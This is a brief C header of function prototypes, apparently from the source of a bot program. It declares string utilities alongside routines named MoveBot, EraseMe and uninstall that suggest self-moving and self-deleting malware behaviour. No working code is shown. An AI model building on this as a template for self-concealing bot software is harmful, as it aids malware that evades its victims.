#ifdef _DEBUG
void DbgPrintFile(char *Format, ...);
#endif

char *substr(char *input, int start, int end);
char *replacestr(char *str, const char *substr, const char *repstr);
BOOL FileExists(LPSTR lpszFilename);
int SplitParams(char *a[MAX_TOKENS],char *line,int depth);
BOOL MoveBot(char *MTP,char *Bname);
int wildcardfit(char *wildcard, char *test);
void EraseMe(BOOL nopause=FALSE);
void uninstall(BOOL thread=FALSE, BOOL difbot=FALSE);
